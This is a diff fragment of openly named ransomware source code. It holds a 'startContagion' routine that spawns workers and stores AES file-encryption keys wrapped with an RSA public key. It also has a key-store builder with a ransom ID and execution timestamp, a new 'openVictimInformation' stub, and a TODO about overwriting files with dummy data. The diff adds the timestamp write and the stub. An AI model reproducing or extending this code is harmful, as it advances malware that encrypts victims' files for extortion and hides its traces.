@@ -13,7 +13,7 @@ from aptal import APTAl
 """
 TODO:1
     re-write file with dummy data :: OK
-    del <object>
+    del <object> :: OK
     garbage collection
 """
 
@@ -65,6 +65,8 @@ def startContagion(path,rsapublickey):
         worker.start()
 
     with open(Utils.aesIV_file_store_path,"ab") as key_storing_file:
+        # protection of starting time against manipulation
+        key_storing_file.write(base64.b64encode(Utils.when_did_i_work)+b"\n")
         # write the AES key to our IV - File storage file
         key_storing_file.write(base64.b64encode(rsa_cipher.encrypt(aeskey)) + b"\n")
         # Recon files
@@ -100,3 +102,8 @@ def keyStoreCreate(version,ransomid):
         key_storing_file.write("When did ransomware work : " + Utils.when_did_i_work + "\n")
         # and so on
     print("STORE FILE CREATED")
+
+def openVictimInformation():
+    print("openVictimInformation")
+
+
